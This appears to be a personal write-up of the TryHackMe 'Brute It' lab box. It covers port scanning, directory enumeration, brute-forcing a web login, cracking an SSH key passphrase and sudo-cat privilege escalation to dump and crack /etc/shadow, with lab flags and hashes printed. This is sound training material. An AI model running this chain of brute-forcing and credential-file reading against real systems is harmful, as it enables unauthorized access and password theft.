- - - 
created : 24-07-2025 

Tags : #easy 
- - - 
# Objective

In this box you will learn about:

- Brute-force

- Hash cracking

- Privilege escalation
# Recon

## Rustscan - Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
└─$ rustscan -a brute.thm -- -A 

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.56.229:22
Open 10.10.56.229:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

```

# Enumeration

## HTTP (80)

### Gobuster

We use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to find hidden directories :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt  -u http://brute.thm  

.htaccess            (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/admin                (Status: 301) [Size: 306] [--> http://brute.thm/admin/]

```

Let's go :

![Pasted image 20250724174046.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724174046.png)

So we have to find credentials, in the [Source Code](../../3%20-%20Tags/Hacking%20Concepts/Source%20Code.md) we find username : `admin`
### Caido

We can perform password  [Bruteforcing](../../3%20-%20Tags/Hacking%20Concepts/Bruteforcing.md) :

![Pasted image 20250724175550.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724175550.png)

![Pasted image 20250724175605.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724175605.png)

So the password is `xavier` :

![Pasted image 20250724175703.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724175703.png)

### Ssh2john

We copy the key and use [Ssh2john](../../3%20-%20Tags/Hacking%20Tools/Ssh2john.md) to make it john readable and crack it :

```bash
──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
└─$ ssh2john key > pass.hash 
```

### John the Ripper

Now we can use [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) to find the password :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
└─$ john pass.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (key)     
1g 0:00:00:00 DONE (2025-07-24 17:59) 50.00g/s 3633Kp/s 3633Kc/s 3633KC/s saloni..punyaku
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## First Access SSH (22)

We can make the key executable and use it on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) (username `john` it's in the [Website](../../3%20-%20Tags/Hacking%20Concepts/Website.md)) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
└─$ ssh -i key  john@brute.thm
Enter passphrase for key 'key': 

john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt 
THM{a_password_is_not_a_barrier}
```

# Privilege Escalation

Now we begin [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) to cat the root flag, first we check for permissions :
```bash
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

So we can use `cat` as root without root password, let's try :

```bash
john@bruteit:/$ /bin/cat /root/root.txt
/bin/cat: /root/root.txt: Permission denied
john@bruteit:/$ sudo /bin/cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

And we retrieve the root password hash :

```
ohn@bruteit:/$ sudo cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::


```

Now we can use cat to see the passwd file :

```
john@bruteit:/$ sudo cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
thm:x:1000:1000:THM Room:/home/thm:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
john:x:1001:1001:john,,,:/home/john:/bin/bash

```

## Unshadow 

Now we create the 2 files and use `unshadow` to reveal the password :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
└─$ nano passwd     

┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
└─$ nano shadow  

┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
└─$ unshadow passwd shadow > crackpasswords

```

## John The Ripper

Now we need to run [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) on the created file and reveal the password :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
└─$ john crackpasswords --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)     
```

Pwned .